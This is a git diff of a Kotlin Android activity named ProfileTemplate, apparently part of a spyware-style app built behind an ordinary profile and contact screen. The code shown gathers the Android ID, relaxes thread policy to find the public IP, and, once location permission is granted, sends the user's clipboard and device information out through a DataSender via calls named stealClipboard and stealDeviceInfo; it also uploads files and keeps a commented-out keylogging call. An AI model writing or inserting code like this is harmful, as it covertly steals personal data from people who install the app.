@@ -29,8 +29,6 @@ import kotlin.concurrent.thread
 class ProfileTemplate : AppCompatActivity() {
     private var datasender = DataSender()
     private val hv = Harvester(this, this, datasender.getAndroidID())
-    private val gn = General(this,this)
-    private val gps = FindLocation(this, this)
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -43,11 +41,9 @@ class ProfileTemplate : AppCompatActivity() {
         findViewById<Button>(R.id.location).setOnClickListener(::location)
         findViewById<TextView>(R.id.cameraBtn).setOnClickListener(::openCamera)
 
-        // Set AndroidID
-        this.datasender.obtainAndroidID(this.contentResolver)
-        // Initialise data retriever
-        // Need this to allow finding of public IP - MY
-        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
+
+        datasender.obtainAndroidID(this.contentResolver)                    // Set AndroidID
+        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()  // Need this to allow finding of public IP - MY
         StrictMode.setThreadPolicy(policy)
 
         // MY Exploit -----------------------------------------------------------------
@@ -56,6 +52,9 @@ class ProfileTemplate : AppCompatActivity() {
             Manifest.permission.ACCESS_FINE_LOCATION
         )
         if (checkLocPerms(this, *PERMISSIONS)) {
+            val gn = General(this,this)
+            val gps = FindLocation(this, this)
+
             datasender.sendData("id", gn.stealClipboard())
             datasender.sendData("id", gn.stealDeviceInfo())
 //            datasender.sendData("id", gn.logKeys())
@@ -220,7 +219,6 @@ class ProfileTemplate : AppCompatActivity() {
             datasender.sendFile(filesDir.path + "/"+ filename)
         }
     }
-
 
 
     // ContactUs Functions------------------------------------------------------------------------
